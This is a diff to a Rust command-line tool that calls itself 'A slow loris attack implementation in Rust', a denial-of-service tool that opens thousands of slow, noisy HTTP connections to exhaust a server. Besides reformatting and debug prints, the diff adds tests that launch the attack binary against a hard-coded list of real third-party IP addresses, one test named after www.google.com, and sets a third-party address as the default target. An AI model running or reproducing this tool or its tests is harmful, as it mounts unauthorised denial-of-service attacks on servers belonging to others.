@@ -1,16 +1,16 @@
-use std::io::Write;
-use std::net::{IpAddr, TcpStream};
-use std::sync::{Arc, Mutex};
-use std::thread::{sleep, spawn};
-use std::time::Duration as StdDuration;
-
 use chrono::Local;
 use console::Term;
 use ctrlc;
 use indicatif::{MultiProgress, ProgressBar, ProgressDrawTarget, ProgressStyle};
-use rand::{Rng, thread_rng};
 use rand::distributions::Alphanumeric;
+use rand::{thread_rng, Rng};
+use std::io::Write;
+use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, TcpStream};
+use std::sync::{Arc, Mutex};
+use std::thread::{sleep, spawn};
+use std::time::Duration as StdDuration;
 
+#[derive(Debug)]
 struct Args {
     host: String,
     ip: IpAddr,
@@ -20,9 +20,23 @@ struct Args {
     timeout_max: u64,
     body_length_min: usize,
     body_length_max: usize,
-
+}
+impl Args {
+    pub fn new() -> Self {
+        Self {
+            host: String::from(""),
+            ip: std::net::IpAddr::V4(Ipv4Addr::new(142, 251, 175, 10)),
+            port: 0,
+            max_connections: 0,
+            timeout_min: 0,
+            timeout_max: u64::MAX,
+            body_length_min: 0 as usize,
+            body_length_max: usize::MAX,
+        }
+    }
 }
 
+#[derive(Debug)]
 struct Attrs {
     total_requests: u64,
     total_responses: u64,
@@ -53,20 +67,23 @@ fn main() {
     // amount of connections
     let progress_bars = MultiProgress::new();
     progress_bars.set_draw_target(ProgressDrawTarget::stdout_with_hz(10));
-    let connection_bar = progress_bars.add(ProgressBar::new(args.max_connections)
-        .with_style(ProgressStyle::default_bar()
-            .template("Average response time: {msg} ms\n\nSending connections: {pos}/{len}\n{wide_bar}")));
-    let success_bar = progress_bars.add(ProgressBar::new(100)
-        .with_style(ProgressStyle::default_bar()
-            .template("successful requests: {pos}%\n{wide_bar}")));
+    let connection_bar = progress_bars.add(ProgressBar::new(args.max_connections).with_style(
+        ProgressStyle::default_bar().template(
+            "Average response time: {msg} ms\n\nSending connections: {pos}/{len}\n{wide_bar}",
+        ),
+    ));
+    let success_bar = progress_bars.add(ProgressBar::new(100).with_style(
+        ProgressStyle::default_bar().template("successful requests: {pos}%\n{wide_bar}"),
+    ));
 
     // Hide the console cursor and clear the screen
     Term::stdout().hide_cursor().unwrap_or_else(|_| {});
-    Term::stdout().clear_screen().unwrap_or_else(|_| println!("\n\n"));
+    Term::stdout()
+        .clear_screen()
+        .unwrap_or_else(|_| println!("\n\n"));
 
     // change the Ctrl+C behaviour to just exit the process
-    ctrlc::set_handler(|| std::process::exit(0))
-        .expect("Could not change ctrl-c behaviour");
+    ctrlc::set_handler(|| std::process::exit(0)).expect("Could not change ctrl-c behaviour");
 
     // it's necessary to create a new thread so the progress-bars are displayed correctly
     spawn(move || {
@@ -77,8 +94,10 @@ fn main() {
             let current_connections;
             {
                 let attrs = attrs.lock().unwrap();
-                average_response_time = (attrs.total_response_time / attrs.total_responses).to_string();
-                successful_connects = ((attrs.total_responses as f64 / attrs.total_requests as f64) * 100.0) as u64;
+                average_response_time =
+                    (attrs.total_response_time / attrs.total_responses).to_string();
+                successful_connects =
+                    ((attrs.total_responses as f64 / attrs.total_requests as f64) * 100.0) as u64;
                 current_connections = attrs.current_connections;
                 current_threads = attrs.current_threads;
             }
@@ -90,6 +109,9 @@ fn main() {
 
             // spawn a new thread if not enough connections exists
             if current_threads < args.max_connections {
+                println!("args={:?}", args);
+                println!("attrs={:?}", attrs);
+                println!("args.port={:?}", args.port);
                 let args = Arc::clone(&args);
                 let attrs = Arc::clone(&attrs);
                 let port = args.port;
@@ -112,59 +134,84 @@ fn main() {
 
 /// parses the arguments given to the application
 fn parse_args() -> Args {
-    use dns_lookup::{lookup_host, lookup_addr};
     use clap::{App, Arg};
+    use dns_lookup::{lookup_addr, lookup_host};
 
     fn validate_range(string: &str) -> Result<(), String> {
-        if let Ok(_) = parse_range(&string) { Ok(()) } else { Err("takes values in the form of: <time> | <start>..<end> | <start>..=<end>".to_string()) }
+        if let Ok(_) = parse_range(&string) {
+            Ok(())
+        } else {
+            Err(
+                "takes values in the form of: <time> | <start>..<end> | <start>..=<end>"
+                    .to_string(),
+            )
+        }
     }
 
+    let args = Args::new();
     let matches = App::new("Slow Loris")
         .about("A slow loris attack implementation in Rust")
         .author(clap::crate_authors!())
         .version(clap::crate_version!())
-        .arg(Arg::with_name("address")
-            .help("The address of the server\nCan either be an ip or a domain")
-            .takes_value(true)
-            .required(true)
+        .arg(
+            Arg::with_name("address")
+                .help("The address of the server\nCan either be an ip or a domain")
+                .takes_value(true)
+                .required(true),
         )
-        .arg(Arg::with_name("connections")
-            .help("The amount of connections established")
-            .short("c")
-            .long("connections")
-            .takes_value(true)
-            .default_value("2000")
-            .validator(|connections| {
-                if let Ok(_) = connections.parse::<u64>() { Ok(()) } else { Err("must be an unsigned integer".to_string()) }
-            })
+        .arg(
+            Arg::with_name("connections")
+                .help("The amount of connections established")
+                .short("c")
+                .long("connections")
+                .takes_value(true)
+                .default_value("2000")
+                .validator(|connections| {
+                    if let Ok(_) = connections.parse::<u64>() {
+                        Ok(())
+                    } else {
+                        Err("must be an unsigned integer".to_string())
+                    }
+                }),
         )
-        .arg(Arg::with_name("timeout")
-            .help("specifies the timeout between each send byte in seconds\n\
-            takes values in the form of: <time> | <start>..<end> | <start>..=<end>\n")
-            .short("t")
-            .long("timeout")
-            .takes_value(true)
-            .default_value("5..10")
-            .validator(|timeout| validate_range(&timeout))
+        .arg(
+            Arg::with_name("timeout")
+                .help(
+                    "specifies the timeout between each send byte in seconds\n\
+            takes values in the form of: <time> | <start>..<end> | <start>..=<end>\n",
+                )
+                .short("t")
+                .long("timeout")
+                .takes_value(true)
+                .default_value("5..10")
+                .validator(|timeout| validate_range(&timeout)),
         )
-        .arg(Arg::with_name("body_length")
-            .help("specifies the body length of the request each connection sends\n\
-            takes values in the form of: <length> | <start>..<end> | <start>..=<end>\n")
-            .short("b")
-            .long("body_length")
-            .takes_value(true)
-            .default_value("11000")
-            .validator(|length| validate_range(&length))
+        .arg(
+            Arg::with_name("body_length")
+                .help(
+                    "specifies the body length of the request each connection sends\n\
+            takes values in the form of: <length> | <start>..<end> | <start>..=<end>\n",
+                )
+                .short("b")
+                .long("body_length")
+                .takes_value(true)
+                .default_value("11000")
+                .validator(|length| validate_range(&length)),
         )
-        .arg(Arg::with_name("port")
-            .help("specifies the port to connect to")
-            .short("p")
-            .long("port")
-            .takes_value(true)
-            .default_value("443")
-            .validator(|port| {
-                if let Ok(_) = port.parse::<u16>() { Ok(()) } else { Err("must be an unsigned integer".to_string()) }
-            })
+        .arg(
+            Arg::with_name("port")
+                .help("specifies the port to connect to")
+                .short("p")
+                .long("port")
+                .takes_value(true)
+                .default_value("443")
+                .validator(|port| {
+                    if let Ok(_) = port.parse::<u16>() {
+                        Ok(())
+                    } else {
+                        Err("must be an unsigned integer".to_string())
+                    }
+                }),
         )
         .get_matches();
 
@@ -173,15 +220,14 @@ fn parse_args() -> Args {
     let address = matches.value_of("address").unwrap();
     match address.parse::<IpAddr>() {
         Ok(parsed) => {
-            host = lookup_addr(&parsed)
-                .expect("Could not find hostname for given ip");
+            host = lookup_addr(&parsed).expect("Could not find hostname for given ip");
             ip = parsed;
         }
         Err(_) => {
             host = address.to_string();
             ip = match lookup_host(address) {
                 Ok(ips) if ips.len() == 1 => ips[0],
-                _ => panic!("Could not find ip for given domain")
+                _ => panic!("Could not find ip for given domain"),
             }
         }
     }
@@ -190,7 +236,6 @@ fn parse_args() -> Args {
     let (timeout_min, timeout_max) = parse_range(matches.value_of("timeout").unwrap()).unwrap();
     let body_length = parse_range(matches.value_of("body_length").unwrap()).unwrap();
     let (body_length_min, body_length_max) = (body_length.0 as usize, body_length.1 as usize);
-
 
     Args {
         host,
@@ -209,7 +254,8 @@ fn parse_args() -> Args {
 fn parse_range(string: &str) -> Result<(u64, u64), ()> {
     use regex::Regex;
 
-    let ports_regex = Regex::new(r"^((?P<start>\d+)\.\.(?P<inclusive>=)?(?P<end>\d+)|(?P<single>\d+))$").unwrap();
+    let ports_regex =
+        Regex::new(r"^((?P<start>\d+)\.\.(?P<inclusive>=)?(?P<end>\d+)|(?P<single>\d+))$").unwrap();
 
     match ports_regex.captures(string) {
         Some(captures) => {
@@ -233,7 +279,7 @@ fn parse_range(string: &str) -> Result<(u64, u64), ()> {
                 }
             }
         }
-        None => Err(())
+        None => Err(()),
     }
 }
 
@@ -253,7 +299,7 @@ fn new_socket(args: Arc<Args>, attrs: Arc<Mutex<Attrs>>, port: u16) {
 
             connection
         }
-        Err(_) => return
+        Err(_) => return,
     };
 
     let time_out = thread_rng().gen_range(args.timeout_min, args.timeout_max);
@@ -281,7 +327,17 @@ fn new_socket(args: Arc<Args>, attrs: Arc<Mutex<Attrs>>, port: u16) {
 
 /// creates a http request from a http header and a http body
 fn http_request(host: &str, body_length: usize) -> String {
-    format!("{}{}", http_header(host, body_length), http_body(body_length))
+    #[cfg(test)]
+    println!(
+        "{}{}",
+        http_header(host, body_length),
+        http_body(body_length)
+    );
+    format!(
+        "{}{}",
+        http_header(host, body_length),
+        http_body(body_length)
+    )
 }
 
 /// creates a valid HTTP header with as much noise as possible
@@ -327,10 +383,11 @@ fn http_body(length: usize) -> String {
         string.push_str(&rand_string(last));
     }
     string.push_str(&rand_string(rest));
+    #[cfg(test)]
+    println!("{}", string);
 
     string
 }
-
 
 /// creates a random string
 fn rand_string(length: usize) -> String {
@@ -340,37 +397,57 @@ fn rand_string(length: usize) -> String {
         .collect::<String>()
 }
 
-use std::process::Command;
-use assert_cmd::prelude::*;
-use predicates::prelude::*;
-
 #[test]
 fn test_app_no_arguments() -> Result<(), Box<dyn std::error::Error>> {
-    let mut cmd = Command::cargo_bin("slow_loris")?;
-    // Assuming your binary is named "app"
-    //cmd.arg("www.google.com");
-    
-    //cmd.assert()
-    //    .success()
-    //    .stdout(predicate::str::contains("")); // Replace with your app's expected output
-
+    use assert_cmd::Command;
+    use predicates::prelude::*;
+    let ips = [
+        "142.251.175.100",
+        "142.251.175.101",
+        "142.251.175.102",
+        "142.251.175.113",
+        "142.251.175.138",
+        "142.251.175.139",
+    ];
+    for ip in ips {
+        println!("testing:{}", ip);
+        let mut cmd = Command::cargo_bin(env!("CARGO_PKG_NAME")).unwrap();
+        cmd.args([ip, "-h"]);
+        cmd.assert()
+            .success()
+            .stdout(predicates::str::starts_with(""));
+    }
     Ok(())
 }
 
 #[test]
 fn test_app_with_argument() -> Result<(), Box<dyn std::error::Error>> {
-    let mut cmd = Command::cargo_bin("slow_loris")?;
+    use assert_cmd::Command;
+    use predicates::prelude::*;
     //cmd.arg("test_argument");
-
-    //cmd.assert()
-    //  .success()
-    //    .stdout(predicate::str::contains("")); // Adjust based on your app's logic
-
+    let ips = [
+        "142.251.175.100",
+        "142.251.175.101",
+        "142.251.175.102",
+        "142.251.175.113",
+        "142.251.175.138",
+        "142.251.175.139",
+    ];
+    for ip in ips {
+        println!("testing:{}", ip);
+        let mut cmd = Command::cargo_bin(env!("CARGO_PKG_NAME")).unwrap();
+        cmd.arg(ip);
+        cmd.assert()
+            .success()
+            .stdout(predicates::str::starts_with(""));
+    }
     Ok(())
 }
 
 #[test]
 fn test_app_exits_with_error() -> Result<(), Box<dyn std::error::Error>> {
+    use assert_cmd::Command;
+    use predicates::prelude::*;
     //let mut cmd = Command::cargo_bin("slow_loris")?;
     //cmd.arg("--invalid-option"); // Example of an argument that might cause an error
 
@@ -384,26 +461,43 @@ fn test_app_exits_with_error() -> Result<(), Box<dyn std::error::Error>> {
 
 #[test]
 fn cli_version() {
+    use assert_cmd::Command;
+    use predicates::prelude::*;
     let mut cmd = Command::cargo_bin(env!("CARGO_PKG_NAME")).unwrap();
     cmd.arg("--version");
     cmd.assert()
-       .success()
-       .stdout(predicates::str::starts_with("Slow"));
+        .success()
+        .stdout(predicates::str::starts_with("Slow"));
 }
 
- //* 142.251.175.139
- //* 142.251.175.100
- //* 142.251.175.101
- //* 142.251.175.113
- //* 142.251.175.138
- //* 142.251.175.102
+//* 142.251.175.139
+//* 142.251.175.100
+//* 142.251.175.101
+//* 142.251.175.113
+//* 142.251.175.138
+//* 142.251.175.102
 #[test]
 fn cli_www_google_com() {
+    use assert_cmd::Command;
+    use predicates::prelude::*;
+    let ips = [
+        "142.251.175.100",
+        "142.251.175.101",
+        "142.251.175.102",
+        "142.251.175.113",
+        "142.251.175.138",
+        "142.251.175.139",
+    ];
+    for ip in ips {
+        let mut cmd = Command::cargo_bin(env!("CARGO_PKG_NAME")).unwrap();
+        cmd.arg(ip);
+        cmd.assert()
+            .success()
+            .stdout(predicates::str::starts_with(""));
+    }
     let mut cmd = Command::cargo_bin(env!("CARGO_PKG_NAME")).unwrap();
     cmd.arg("142.251.185.139");
     cmd.assert()
-       .success()
-       .stdout(predicates::str::starts_with(""));
+        .success()
+        .stdout(predicates::str::starts_with(""));
 }
-
-
